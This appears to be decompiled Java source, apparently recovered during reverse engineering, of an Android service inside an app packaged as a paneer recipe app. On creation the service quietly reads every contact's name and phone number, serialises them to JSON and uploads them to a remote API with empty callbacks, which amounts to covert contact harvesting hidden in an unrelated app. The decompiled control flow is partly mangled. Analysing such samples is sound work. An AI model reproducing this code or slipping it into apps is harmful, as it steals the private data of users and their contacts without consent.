package com.varni.paneerrecipesinenglish.service;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.support.annotation.Nullable;
import com.google.gson.Gson;
import com.varni.paneerrecipesinenglish.model.ContactModel;
import com.varni.paneerrecipesinenglish.utils.Constants;
import com.varni.paneerrecipesinenglish.webapi.ApiClient;
import com.varni.paneerrecipesinenglish.webapi.ApiInterface;
import java.util.ArrayList;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;

public class ContactInfoService
  extends Service
{
  String TAG = getClass().getSimpleName();
  ApiInterface apiInterface;
  ArrayList<ContactModel> arrayList;
  ContactModel contactModel;
  
  private void callApi()
  {
    this.apiInterface = ((ApiInterface)ApiClient.getClient().create(ApiInterface.class));
    String str = new Gson().toJson(this.arrayList);
    this.apiInterface.PassJson_data(str).enqueue(new Callback()
    {
      public void onFailure(Call<ResponseBody> paramAnonymousCall, Throwable paramAnonymousThrowable) {}
      
      public void onResponse(Call<ResponseBody> paramAnonymousCall, Response<ResponseBody> paramAnonymousResponse) {}
    });
  }
  
  public void allContact()
  {
    this.arrayList = new ArrayList();
    ContentResolver localContentResolver = getContentResolver();
    Cursor localCursor1 = localContentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
    if (localCursor1 != null) {}
    for (;;)
    {
      Cursor localCursor2;
      try
      {
        if (localCursor1.getCount() > 0) {
          if (localCursor1.moveToNext())
          {
            String str1 = localCursor1.getString(localCursor1.getColumnIndex("_id"));
            String str2 = localCursor1.getString(localCursor1.getColumnIndex("display_name"));
            if (localCursor1.getInt(localCursor1.getColumnIndex("has_phone_number")) <= 0) {
              continue;
            }
            localCursor2 = localContentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id = ?", new String[] { str1 }, null);
            if (!localCursor2.moveToNext()) {
              break label223;
            }
            String str3 = localCursor2.getString(localCursor2.getColumnIndex("data1"));
            this.contactModel = new ContactModel();
            this.contactModel.setName(str2);
            this.contactModel.setNumber(str3);
            this.contactModel.setCity("");
            this.contactModel.setCountry("");
            this.contactModel.setEmail("");
            this.contactModel.setState("");
            continue;
          }
        }
        return;
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
      }
      label223:
      this.arrayList.add(this.contactModel);
      localCursor2.close();
    }
  }
  
  @Nullable
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    new AsyncTask().execute(new Object[0]);
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    return super.onStartCommand(paramIntent, paramInt1, paramInt2);
  }
  
  class AsyncTask
    extends AsyncTask
  {
    AsyncTask() {}
    
    protected Object doInBackground(Object[] paramArrayOfObject)
    {
      ContactInfoService.this.allContact();
      return null;
    }
    
    protected void onPostExecute(Object paramObject)
    {
      super.onPostExecute(paramObject);
      if (Constants.isCheckInternetcon(ContactInfoService.this)) {
        ContactInfoService.this.callApi();
      }
    }
  }
}


/* Location:              D:\Chandresh\reverse engineering\1\dex2jar & jd-gui\dex2jar-0.0.9.15\dex2jar-0.0.9.15\classes_dex2jar.jar!\com\varni\paneerrecipesinenglish\service\ContactInfoService.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */